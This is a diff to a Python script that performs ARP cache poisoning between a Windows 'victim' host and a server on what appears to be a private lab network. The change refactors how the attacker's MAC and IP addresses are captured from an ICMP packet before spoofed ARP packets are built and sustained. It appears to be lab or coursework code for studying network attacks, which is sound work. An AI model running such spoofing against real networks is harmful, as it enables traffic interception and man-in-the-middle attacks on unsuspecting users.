@@ -5,9 +5,9 @@ import threading
 #icmp to capture
 global icmp_packet_global
 
-#attacker
-global macAttacker # = "08:00:27:d0:25:4b"
-global ipAttacker # = "192.168.56.103"
+# #attacker
+# global macAttacker = "08:00:27:d0:25:4b"
+# global ipAttacker = "192.168.56.103"
 
 #victim1
 macWindows = "08:00:27:b7:c4:af"
@@ -23,8 +23,10 @@ def find_mac_ip(packet):
     global ipAttacker
 
     if packet.haslayer(Ether) and packet.haslayer(IP):
-        macAttacker = packet[Ether].src
-        ipAttacker = packet[IP].src
+        macc = packet[Ether].src
+        ipp = packet[IP].src
+
+        return [macc, ipp]
 
 def send_ping():
     icmp_packet = IP() / ICMP()
@@ -59,7 +61,9 @@ def maintain_arp_poison(arp1, arp2):
 if __name__ == "__main__":
     thread_sniff = threading.Thread(sniff_icmp())
     send_ping()
-    find_mac_ip(icmp_packet_global)
+    the_ar = find_mac_ip(icmp_packet_global)
+    macAttacker = the_ar[0]
+    ipAttacker = the_ar[1]
 
     arp1 = create_pack(macAttacker, ipServer, ipWindows)
     arp2 = create_pack(macAttacker, ipWindows, ipServer)
